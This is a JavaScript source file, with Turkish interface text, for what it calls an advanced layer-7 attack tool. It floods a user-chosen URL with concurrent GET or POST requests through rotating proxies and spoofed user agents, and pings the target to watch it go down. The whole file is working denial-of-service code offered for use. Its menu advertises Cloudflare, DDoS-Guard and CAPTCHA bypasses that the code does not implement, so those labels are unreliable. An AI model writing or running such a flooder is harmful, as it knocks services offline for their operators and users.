const axios = require('axios');
const fs = require('fs').promises;
const colors = require('colors');
const readline = require('readline');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let proxies = [];

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
  "Mozilla/5.0 (X11; Linux x86_64)..."
];

function getRandom(array) {
  return array[Math.floor(Math.random() * array.length)];
}

function log(msg, color = 'white') {
  console.log(msg[color]);
}

async function loadProxies() {
  try {
    const data = await fs.readFile('proxies.txt', 'utf8');
    proxies = data.split('\n').map(p => p.trim()).filter(Boolean);
    log(`✅ ${proxies.length} proxy yüklendi`, 'green');
  } catch (err) {
    log('❌ proxies.txt bulunamadı!', 'red');
    process.exit();
  }
}

async function sendRequest(url, method = 'GET') {
  const proxy = getRandom(proxies);
  const headers = {
    'User-Agent': getRandom(userAgents),
    'Accept': '*/*',
    'Connection': 'keep-alive'
  };

  const config = {
    method: method === 'POST' ? 'post' : 'get',
    url,
    headers,
    timeout: 8000
  };

  if (proxy) {
    const [ip, port] = proxy.split(':');
    const agent = proxy.includes('socks')
      ? new SocksProxyAgent(`socks5://${ip}:${port}`)
      : new HttpsProxyAgent(`http://${ip}:${port}`);
    config.httpAgent = agent;
    config.httpsAgent = agent;
  }

  try {
    const res = await axios(config);
    return { status: res.status, success: true };
  } catch (err) {
    return { success: false, error: err.code || err.message };
  }
}

function startPing(url) {
  setInterval(async () => {
    try {
      const res = await axios.get(url, { timeout: 5000 });
      console.log(`\n✔️ Ping başarılı - ${res.status}`.green);
    } catch {
      console.log(`\n❌ Ping başarısız`.red);
    }
  }, 10000); // 10 saniyede bir
}

async function startAttack({ url, duration, method, threads }) {
  const end = Date.now() + duration * 1000;
  let success = 0, fail = 0;

  log('\n🚀 SALDIRI BAŞLADI!'.rainbow.bold);
  log(`🎯 Hedef: ${url}`, 'cyan');
  log(`⏱️ Süre: ${duration}s`, 'cyan');
  log(`🧵 Thread: ${threads}`, 'cyan');
  log(`💣 Metod: ${method}`, 'cyan');

  startPing(url); // Ping kontrolü başlasın

  const attack = async () => {
    while (Date.now() < end) {
      const res = await sendRequest(url, method);
      if (res.success) {
        success++;
        process.stdout.write(`[+] ${res.status} `.green);
      } else {
        fail++;
        process.stdout.write(`[-] ${res.error} `.red);
      }
    }
  };

  const runners = Array.from({ length: threads }, () => attack());
  await Promise.all(runners);

  log(`\n✅ Saldırı tamamlandı! Başarılı: ${success}, Başarısız: ${fail}`, 'yellow');
}

async function ask(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

async function main() {
  await loadProxies();

  console.clear();
  console.log('\n🔥 ' + 'L7 Gelişmiş Saldırı Aracı'.rainbow.bold);
  console.log('1 - GET Flood');
  console.log('2 - POST Flood');
  console.log('3 - Cloudflare Bypass');
  console.log('4 - DDoS-Guard Bypass');
  console.log('5 - CAPTCHA Bypass');
  console.log('6 - Karışık');

  const methodMap = {
    '1': 'GET',
    '2': 'POST',
    '3': 'CF',
    '4': 'DDG',
    '5': 'CAPTCHA',
    '6': 'MIXED'
  };

  const methodInput = await ask('Metod Seç (1-6): ');
  const method = methodMap[methodInput] || 'GET';

  const url = await ask('Hedef URL (örn: https://site.com): ');
  const duration = parseInt(await ask('Süre (saniye): '));
  const threads = parseInt(await ask('Kaç thread: '));

  rl.close();

  await startAttack({ url, duration, method, threads });
}

main();
